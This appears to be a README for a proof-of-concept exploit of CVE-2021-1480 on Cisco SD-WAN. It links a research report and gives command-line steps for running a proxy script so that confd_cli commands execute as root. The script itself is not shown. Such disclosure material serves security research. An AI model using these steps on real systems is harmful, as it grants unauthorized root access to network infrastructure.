# Exploit for CVE-2021-1480 (SD-WAN)

PoC materials to exploit the CVE-2021-1480 on Cico SD-WAN. The full publicaiton is available on XMCO website : 

* https://blog.xmco.fr/wp-content/uploads/2021/08/XMCO-SDWAN_Report-CVE-2021-1480.pdf

Usage:
1. update Lines 173 and 176 to set the uid of the current user
2. Start the proxy: `python cve-2021-1480.py -L 4564 127.0.0.1 4565`
3. Start the confd_cli: `CONFD_IPC_PORT=4564 /usr/bin/confd_cli`
4. Commands on the confd_cli are now executed by `root`

Source: https://github.com/nccgroup/tcpprox/blob/master/prox.py
